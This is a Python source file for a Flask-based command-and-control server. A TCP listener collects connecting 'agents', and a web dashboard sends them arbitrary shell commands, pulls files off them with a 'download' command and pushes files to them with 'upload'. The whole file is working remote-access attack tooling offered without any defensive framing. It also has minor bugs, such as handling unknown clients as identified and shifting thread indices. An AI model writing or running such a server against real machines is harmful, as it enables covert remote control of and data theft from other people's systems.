import socket
import threading
import time
from flask import *

LHOST = '127.0.0.1'
LPORT = 4444
IPS = []
THREADS = []
#cmd input comes from the website
CMD_INPUT = []
#cmd out to collect output from client
CMD_OUTPUT = []


#inittializing global vars
for i in range(20):
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append("")



def handle_conn(connection, addr, thread_index):
    global CMD_OUTPUT
    global CMD_INPUT
    client_data = connection.recv(1024).decode()
    if client_data == "CLIENT HELLO":
        print("Client Authenticated")
        CMD_OUTPUT[thread_index] = "Client Identified"
    else:
        print("Unknown Client")
        CMD_OUTPUT[thread_index] = "Client Identified"
        close_connection(connection, thread_index)
    
    #getting client hell
    
    while CMD_INPUT[thread_index] != 'quit':
        # print("Current input: ", CMD_INPUT[thread_index])
        # client_data = connection.recv(1024).decode()
        # print("Received: ", client_data)
        # CMD_OUTPUT[thread_index] = client_data
        # print("Updated output: ", CMD_OUTPUT[thread_index])
        while True:
            if CMD_INPUT[thread_index] != "":
                #download filename
                if CMD_INPUT[thread_index].split(" ")[0] == "download":
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    #recving max 10mb
                    contents = connection.recv(1024*10000)
                    print(contents)
                    f = open("./output/"+filename, "wb")
                    f.write(contents)
                    f.close()
                    CMD_OUTPUT[thread_index] = "File Tranferred Sucessfully"
                    #clearing cmd input
                    CMD_INPUT[thread_index]=""
                    
                elif CMD_INPUT[thread_index].split(" ")[0] == "upload":
                    #upload filename 2048
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    filename = CMD_INPUT[thread_index].split(" ")[1]
                    filesize = CMD_INPUT[thread_index].split(" ")[2]
                    cmd = CMD_INPUT[thread_index]
                    with open(filename, "rb") as f:
                        file_content = f.read()
                        connection.send(file_content)
                    msg = connection.recv(2048).decode()
                    if msg == "Received file!":
                        CMD_OUTPUT[thread_index] = "File Sent Sucessfully!"
                    else:
                        CMD_OUTPUT[thread_index] = "Error uploading file"
                    CMD_INPUT[thread_index]=""
                    
                else :
                    msg = CMD_INPUT[thread_index]
                    #print("Current command", msg)
                    connection.send(msg.encode())
                    client_data = connection.recv(1024).decode()
                    #print("Received: ", client_data)
                    CMD_OUTPUT[thread_index] = client_data
                    CMD_INPUT[thread_index]=''   
            else:
                break
    close_connection(connection, thread_index)
        
def close_connection(connection, thread_index):
    print("Closing connection")
    connection.close()
    THREADS.pop(thread_index)
    IPS[thread_index] = ''
    CMD_INPUT[thread_index] = ''
    CMD_OUTPUT[thread_index] = ''


def init_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((LHOST, LPORT))
    server_socket.listen(2)
    global THREADS
    global IPS
    global thread_index
    while True:
        client_socket, address = server_socket.accept()
        print("Connection received", address)
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_conn,args=(client_socket,address, thread_index))
        THREADS.append(t)
        IPS[thread_index] = address
        t.start()



app = Flask(__name__)
#before first request is depricated use @app.app_context() instead
#@app.route('before_first_request')
with app.app_context():
    t1 = threading.Thread(target=init_server)
    t1.start()
    
@app.route("/")
@app.route("/home")
def index():
    return render_template("index.html")


@app.route("/agents")
def agents():
    global THREADS
    global IPS
    return render_template("agents.html", threads=THREADS, ips=IPS)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html", agentname=agentname)
    
    
@app.route("/<agentname>/execute", methods=["GET", "POST"])
def execute(agentname):
    if request.method == "POST":
        cmd = request.form['command']
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        CMD_INPUT[req_index] = cmd
        #giving enough time to execute the program
        time.sleep(1)
        cmd_output = CMD_OUTPUT[req_index]
    return render_template("execute.html", agentname=agentname, result=cmd_output)
    
if __name__=="__main__":
    app.run(debug=True)


